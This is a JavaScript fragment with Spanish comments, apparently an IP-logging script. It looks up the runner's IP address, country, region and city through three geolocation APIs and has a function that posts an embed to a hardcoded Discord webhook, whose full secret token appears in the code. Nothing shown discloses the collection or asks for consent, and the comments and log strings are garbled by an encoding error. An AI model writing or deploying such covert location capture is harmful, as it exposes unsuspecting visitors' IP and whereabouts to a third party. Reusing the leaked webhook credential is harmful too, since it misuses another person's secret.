const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1406743806082285639/Y_ATEj7MhgBr8ln47i6-xSeEnvBTPJ5Y8PbsaFSAYNmQt7aJtHz7cMR1I1by-Zhd5yMB';

// Funci√≥n para obtener informaci√≥n de localizaci√≥n
async function getLocationInfo() {
    try {
        console.log('üåç Obteniendo localizaci√≥n...');
        
        // Usar ipapi.co que es m√°s confiable
        const response = await fetch('https://ipapi.co/json/');
        const data = await response.json();
        
        if (data && data.ip) {
            console.log('‚úÖ Localizaci√≥n obtenida:', data);
            return {
                ip: data.ip || 'No disponible',
                country: data.country_name || 'No disponible',
                region: data.region || 'No disponible',
                city: data.city || 'No disponible'
            };
        } else {
            throw new Error('Respuesta inv√°lida de ipapi.co');
        }
    } catch (error) {
        console.warn('‚ö†Ô∏è Error con ipapi.co, probando alternativa:', error);
        
        // Fallback: usar ip-api.com
        try {
            const response2 = await fetch('http://ip-api.com/json/');
            const data2 = await response2.json();
            
            if (data2.status === 'success') {
                console.log('‚úÖ Localizaci√≥n obtenida (fallback):', data2);
                return {
                    ip: data2.query || 'No disponible',
                    country: data2.country || 'No disponible',
                    region: data2.regionName || 'No disponible',
                    city: data2.city || 'No disponible'
                };
            } else {
                throw new Error('Error en ip-api.com');
            }
        } catch (error2) {
            console.warn('‚ö†Ô∏è Error con ip-api.com, usando solo IP:', error2);
            
            // √öltimo fallback: solo IP
            try {
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipResponse.json();
                return {
                    ip: ipData.ip || 'No disponible',
                    country: 'No disponible',
                    region: 'No disponible',
                    city: 'No disponible'
                };
            } catch (ipError) {
                console.error('‚ùå Error obteniendo IP:', ipError);
                return {
                    ip: 'No disponible',
                    country: 'No disponible',
                    region: 'No disponible',
                    city: 'No disponible'
                };
            }
        }
    }
}

// Funci√≥n para enviar mensaje a Discord
async function sendDiscordMessage(embed) {
    try {
        console.log('üì§ Enviando mensaje a Discord...');
        
        const response = await fetch(DISCORD_WEBHOOK_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                embeds: [embed]
            })
        });

        if (response.ok) {
            console.log('‚úÖ Mensaje enviado exitosamente a Discord');
            return true;
        } else {
            console.error('‚ùå Error de API Discord:', response.status, response.statusText);
            return false;
        }
    } catch (error) {
        console.error('‚ùå Error de red:', error);
        return false;
    }
}

